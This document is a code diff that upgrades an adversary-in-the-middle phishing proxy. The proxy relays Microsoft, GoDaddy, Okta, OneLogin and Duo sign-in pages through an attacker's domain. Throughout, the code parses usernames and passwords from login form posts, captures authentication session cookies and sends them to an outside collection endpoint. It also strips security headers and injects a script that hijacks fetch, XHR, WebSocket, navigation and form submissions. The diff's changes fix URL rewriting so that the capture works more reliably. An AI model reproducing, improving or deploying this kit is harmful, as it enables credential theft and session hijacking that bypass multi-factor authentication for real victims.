@@ -31,7 +31,8 @@ const IDENTITY_PROVIDERS = {
   'sso.secureserver.net': { type: 'godaddy', name: 'GoDaddy Legacy' },
   'csp.secureserver.net': { type: 'godaddy', name: 'GoDaddy CSP' },
   'api.godaddy.com': { type: 'godaddy', name: 'GoDaddy API' },
-  'www.godaddy.com': { type: 'godaddy', name: 'GoDaddy WWW' }
+  'www.godaddy.com': { type: 'godaddy', name: 'GoDaddy WWW' },
+  'img1.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images' }
 };
 
 const CRITICAL_AUTH_COOKIES = {
@@ -41,13 +42,6 @@ const CRITICAL_AUTH_COOKIES = {
   duo: ['.*'],
   godaddy: ['akm_lmprb-ssn', 'akm_lmprb', 'auth_id', 'auth_token', 'ssotoken', 'JSESSIONID']
 };
-
-// Additional domains that should be proxied if encountered
-const ADDITIONAL_DOMAINS = [
-  'secureserver.net',
-  'godaddy.com',
-  'godaddycdn.com'
-];
 // =======================================================================
 
 async function sendToVercel(type, data) {
@@ -137,15 +131,16 @@ function shouldProxyDomain(hostname) {
   if (hostname.includes('okta.com')) return true;
   if (hostname.includes('onelogin.com')) return true;
   if (hostname.includes('duosecurity.com')) return true;
+  if (hostname.includes('wsimg.com')) return true;
   return false;
 }
 
-function rewriteUrl(url) {
+function rewriteUrl(url, upstreamDomain) {
   try {
     // Handle absolute URLs
     if (url.startsWith('http://') || url.startsWith('https://')) {
       const urlObj = new URL(url);
-      if (shouldProxyDomain(urlObj.hostname)) {
+      if (shouldProxyDomain(urlObj.hostname) && !urlObj.hostname.includes(YOUR_DOMAIN)) {
         return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${urlObj.hostname}${urlObj.pathname}${urlObj.search}`;
       }
       return url;
@@ -158,6 +153,11 @@ function rewriteUrl(url) {
         return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${hostname}${url.substring(2 + hostname.length)}`;
       }
       return 'https:' + url;
+    }
+    
+    // Handle relative URLs - THIS WAS MISSING
+    if (url.startsWith('/') && upstreamDomain) {
+      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}${url}`;
     }
     
     return url;
@@ -193,13 +193,20 @@ function rewriteUrls(text, upstreamDomain) {
     );
   });
   
-  // Fix relative paths for current upstream
+  // Fix relative paths for current upstream - convert to absolute proxy URLs
+  // Match href="/path" or src="/path" or url(/path)
   result = result.replace(
-    /(["'])\/(common|ppsecure|auth|api|v1|v2|Me\.htm|Prefetch\.aspx|login|oauth2|GetCredentialType)/g,
+    /((?:href|src|action)=["'])\/([^"']*)/g,
     `$1https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$2`
   );
   
-  // Fix JS hostname/domain assignments
+  // Fix CSS url(/path)
+  result = result.replace(
+    /url\(["']?\/([^"')]+)["']?\)/g,
+    `url(https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$1)`
+  );
+  
+  // Fix JS references to window.location
   result = result.replace(
     /window\.location\.hostname\s*=\s*["'][^"']+["']/g,
     `window.location.hostname = "${YOUR_DOMAIN}"`
@@ -207,10 +214,6 @@ function rewriteUrls(text, upstreamDomain) {
   result = result.replace(
     /document\.domain\s*=\s*["'][^"']+["']/g,
     `document.domain = "${YOUR_DOMAIN}"`
-  );
-  result = result.replace(
-    /window\.__DOMAIN__\s*=\s*["'][^"']+["']/g,
-    `window.__DOMAIN__ = "${YOUR_DOMAIN}"`
   );
   
   return result;
@@ -237,7 +240,6 @@ function hasCriticalAuthCookies(cookieString, platform) {
   });
 }
 
-// ==================== UNIVERSAL CREDENTIAL PARSING ====================
 function parseCredentials(bodyText) {
   const keyValuePairs = bodyText.split('&');
   let user = null;
@@ -249,19 +251,10 @@ function parseCredentials(bodyText) {
     
     const decodedValue = decodeURIComponent(value.replace(/\+/g, ' '));
     
-    // Microsoft fields
-    if (key === 'login' || key === 'loginfmt') {
+    if (key === 'login' || key === 'loginfmt' || key === 'username' || key === 'email' || key === 'user') {
       user = decodedValue;
     }
-    if (key === 'passwd') {
-      pass = decodedValue;
-    }
-    
-    // GoDaddy fields (and generic fields)
-    if (key === 'username' || key === 'email' || key === 'user') {
-      user = decodedValue;
-    }
-    if (key === 'password' || key === 'pwd' || key === 'pass') {
+    if (key === 'passwd' || key === 'password' || key === 'pwd' || key === 'pass') {
       pass = decodedValue;
     }
   }
@@ -270,7 +263,7 @@ function parseCredentials(bodyText) {
 }
 
 // ==================== CLIENT-SIDE INTERCEPTOR SCRIPT ====================
-function generateInterceptorScript() {
+function generateInterceptorScript(upstreamDomain) {
   return `
 <script>
 (function() {
@@ -278,12 +271,13 @@ function generateInterceptorScript() {
   
   const PROXY_PREFIX = '${PROXY_PREFIX}';
   const YOUR_DOMAIN = '${YOUR_DOMAIN}';
+  const CURRENT_UPSTREAM = '${upstreamDomain}';
   
   function shouldProxyDomain(hostname) {
     const domains = [
       'microsoftonline.com', 'live.com', 'microsoft.com', 'msauth.net',
       'office.com', 'godaddy.com', 'secureserver.net', 'okta.com',
-      'onelogin.com', 'duosecurity.com'
+      'onelogin.com', 'duosecurity.com', 'wsimg.com'
     ];
     return domains.some(d => hostname.includes(d));
   }
@@ -291,15 +285,36 @@ function generateInterceptorScript() {
   function rewriteUrl(url) {
     if (!url) return url;
     try {
+      // Absolute URLs
       if (url.startsWith('http')) {
         const urlObj = new URL(url);
         if (shouldProxyDomain(urlObj.hostname) && !urlObj.hostname.includes(YOUR_DOMAIN)) {
           return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + urlObj.hostname + urlObj.pathname + urlObj.search;
         }
-      } else if (url.startsWith('//')) {
+        return url;
+      }
+      
+      // Protocol-relative
+      if (url.startsWith('//')) {
         const hostname = url.split('/')[2];
         if (shouldProxyDomain(hostname)) {
           return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + hostname + url.substring(2 + hostname.length);
+        }
+        return 'https:' + url;
+      }
+      
+      // Relative URLs - CRITICAL FIX
+      if (url.startsWith('/')) {
+        return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + CURRENT_UPSTREAM + url;
+      }
+      
+      // Relative without slash (e.g., "api/endpoint")
+      if (!url.startsWith('http') && !url.startsWith('#') && !url.startsWith('data:')) {
+        // Check if it's a relative path that needs proxying
+        const currentPath = window.location.pathname;
+        if (currentPath.includes(PROXY_PREFIX)) {
+          // We're already in a proxied context, keep it relative to current proxy
+          return url;
         }
       }
     } catch(e) {}
@@ -309,20 +324,21 @@ function generateInterceptorScript() {
   // Override fetch
   const originalFetch = window.fetch;
   window.fetch = function(url, options) {
-    const newUrl = rewriteUrl(url);
-    if (newUrl !== url) {
-      console.log('[Proxy Interceptor] Fetch:', url, '->', newUrl);
+    if (typeof url === 'string') {
+      url = rewriteUrl(url);
+    } else if (url instanceof Request) {
+      const newUrl = rewriteUrl(url.url);
+      if (newUrl !== url.url) {
+        url = new Request(newUrl, url);
+      }
     }
-    return originalFetch.call(this, newUrl, options);
+    return originalFetch.call(this, url, options);
   };
   
   // Override XMLHttpRequest
   const originalOpen = XMLHttpRequest.prototype.open;
   XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
     const newUrl = rewriteUrl(url);
-    if (newUrl !== url) {
-      console.log('[Proxy Interceptor] XHR:', url, '->', newUrl);
-    }
     return originalOpen.call(this, method, newUrl, async, user, password);
   };
   
@@ -330,32 +346,82 @@ function generateInterceptorScript() {
   const originalWebSocket = window.WebSocket;
   window.WebSocket = function(url, protocols) {
     const newUrl = rewriteUrl(url);
-    if (newUrl !== url) {
-      console.log('[Proxy Interceptor] WebSocket:', url, '->', newUrl);
-    }
     return new originalWebSocket(newUrl, protocols);
   };
   
-  // Override window.location redirects
-  const originalAssign = window.location.assign;
-  const originalReplace = window.location.replace;
-  
-  window.location.assign = function(url) {
-    return originalAssign.call(window.location, rewriteUrl(url));
-  };
-  window.location.replace = function(url) {
-    return originalReplace.call(window.location, rewriteUrl(url));
-  };
+  // Override location.assign and replace properly (fixing read-only error)
+  try {
+    const originalAssign = window.location.assign.bind(window.location);
+    Object.defineProperty(window.location, 'assign', {
+      value: function(url) {
+        return originalAssign(rewriteUrl(url));
+      },
+      writable: true,
+      configurable: true
+    });
+    
+    const originalReplace = window.location.replace.bind(window.location);
+    Object.defineProperty(window.location, 'replace', {
+      value: function(url) {
+        return originalReplace(rewriteUrl(url));
+      },
+      writable: true,
+      configurable: true
+    });
+    
+    // Also override href setter
+    const originalHref = Object.getOwnPropertyDescriptor(window.location, 'href');
+    if (originalHref) {
+      Object.defineProperty(window.location, 'href', {
+        get: originalHref.get,
+        set: function(url) {
+          return originalHref.set.call(this, rewriteUrl(url));
+        },
+        configurable: true
+      });
+    }
+  } catch(e) {
+    console.log('[Proxy] Could not override location methods:', e);
+  }
   
   // Intercept form submissions
   document.addEventListener('submit', function(e) {
     const form = e.target;
-    if (form.action && shouldProxyDomain(new URL(form.action).hostname)) {
-      form.action = rewriteUrl(form.action);
+    if (form.action && form.action.startsWith('http')) {
+      const newAction = rewriteUrl(form.action);
+      if (newAction !== form.action) {
+        form.action = newAction;
+      }
     }
   }, true);
   
-  console.log('[Proxy Interceptor] Active - all requests routing through ${YOUR_DOMAIN}');
+  // Fix all existing links and forms on load
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', fixExistingElements);
+  } else {
+    fixExistingElements();
+  }
+  
+  function fixExistingElements() {
+    // Fix all links
+    document.querySelectorAll('a[href]').forEach(el => {
+      const href = el.getAttribute('href');
+      if (href && (href.startsWith('/') || shouldProxyDomain(href))) {
+        el.href = rewriteUrl(href);
+      }
+    });
+    
+    // Fix all images and scripts
+    document.querySelectorAll('img[src], script[src], link[href]').forEach(el => {
+      const attr = el.src ? 'src' : 'href';
+      const val = el.getAttribute(attr);
+      if (val && val.startsWith('/')) {
+        el.setAttribute(attr, rewriteUrl(val));
+      }
+    });
+  }
+  
+  console.log('[Proxy Interceptor] Active for upstream:', CURRENT_UPSTREAM);
 })();
 </script>`;
 }
@@ -377,27 +443,31 @@ export default async function handleRequest(request) {
   
   console.log(`[${info.type}] ${request.method} ${displayUrl} -> ${upstreamUrl}`);
 
-  // Build headers
-  const headers = new Headers(request.headers);
-  headers.set('Host', upstreamDomain);
-  headers.set('Referer', `https://${upstreamDomain}/`);
-  headers.set('Origin', `https://${upstreamDomain}`);
-  
-  // Handle preflight requests explicitly
+  // Handle preflight requests
   if (request.method === 'OPTIONS') {
     return new Response(null, {
       status: 200,
       headers: {
         'Access-Control-Allow-Origin': '*',
         'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, PATCH, OPTIONS',
-        'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With',
+        'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With, X-Requested-By',
         'Access-Control-Allow-Credentials': 'true',
         'Access-Control-Max-Age': '86400'
       }
     });
   }
 
-  // ==================== CREDENTIAL CAPTURE ====================
+  // Build headers
+  const headers = new Headers(request.headers);
+  headers.set('Host', upstreamDomain);
+  headers.set('Referer', `https://${upstreamDomain}/`);
+  headers.set('Origin', `https://${upstreamDomain}`);
+  
+  // Remove problematic headers
+  headers.delete('x-forwarded-host');
+  headers.delete('x-forwarded-proto');
+
+  // Credential capture
   if (request.method === 'POST') {
     try {
       const temp_req = await request.clone();
@@ -408,7 +478,7 @@ export default async function handleRequest(request) {
       const { user, pass } = parseCredentials(bodyText);
       
       if (user && pass) {
-        console.log(`[CREDENTIALS CAPTURED] User: ${user.substring(0, 5)}... Pass: **** Platform: ${info.type}`);
+        console.log(`[CREDENTIALS CAPTURED] User: ${user.substring(0, 5)}... Platform: ${info.type}`);
         
         await sendToVercel('credentials', {
           type: "creds",
@@ -474,7 +544,7 @@ export default async function handleRequest(request) {
     newHeaders.delete('clear-site-data');
     newHeaders.delete('strict-transport-security');
     
-    // Handle cookies - remove Domain and Secure attributes, set SameSite=None
+    // Handle cookies
     const cookies = resp.headers.getSetCookie?.() || [resp.headers.get('Set-Cookie')].filter(Boolean);
     let shouldCaptureCookies = false;
     let cookieStr = '';
@@ -502,12 +572,14 @@ export default async function handleRequest(request) {
     const ct = resp.headers.get('content-type') || '';
     if (/text\/html|application\/javascript|application\/json|text\/javascript/.test(ct)) {
       let text = await resp.text();
+      
+      // Rewrite all URLs including relative ones
       text = rewriteUrls(text, upstreamDomain);
       
       // Inject interceptor script into HTML
       if (ct.includes('text/html')) {
-        const interceptor = generateInterceptorScript();
-        // Insert after <head> or at the beginning
+        const interceptor = generateInterceptorScript(upstreamDomain);
+        // Insert as early as possible
         if (text.includes('<head>')) {
           text = text.replace('<head>', '<head>' + interceptor);
         } else if (text.includes('<html>')) {
